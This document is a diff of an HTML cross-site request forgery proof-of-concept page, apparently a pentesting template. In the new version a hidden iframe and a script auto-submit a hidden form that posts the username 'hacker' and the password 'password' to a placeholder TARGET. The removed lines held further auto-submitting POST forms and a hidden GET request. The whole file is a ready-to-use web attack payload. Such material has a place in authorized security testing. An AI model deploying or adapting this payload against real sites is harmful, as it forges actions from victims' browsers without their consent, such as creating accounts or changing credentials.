@@ -1,27 +1,16 @@
 <html>
 <head></head>
-<body onload="document.forms[0].submit(); document.forms[1].submit();">
+<body>
 	<h1>CSRF PoC</h1>
-	
 	<!-- POST Form 1 -->
 	<iframe name="send" style="display:none"></iframe>
 	
-    <form target="send" action="http://TARGET/form_action" method="POST">
-        <input type="hidden" name="field1" value="">
-        <input type="hidden" name="field2" value="">
-        <input type="hidden" name="field3" value="">
+    <form id="send" target="send" action="http://TARGET" method="POST">
+        <input type="hidden" name="userName" value="hacker">
+        <input type="hidden" name="pass" value="password">
+		<input type='submit' value='submit'>
     </form>
-    
-	<!-- POST Form 2 -->
-	<iframe name="question" style="display:none"></iframe>
-    
-    <form  target="question" action="http://TARGET/form_action" method="POST">
-        <input type="hidden" name="field1" value=''>
-		<input type="hidden" name="field2" value=''>
-    </form>
-	
-	<!-- GET URL  -->	
-	<iframe src="http://TARGET/form_action.ext?field1=value1&field2=value2&field3=value3" style="display:none"></iframe>
+<script>document.getElementById("send").submit()</script>
  
 </body>
 </html>
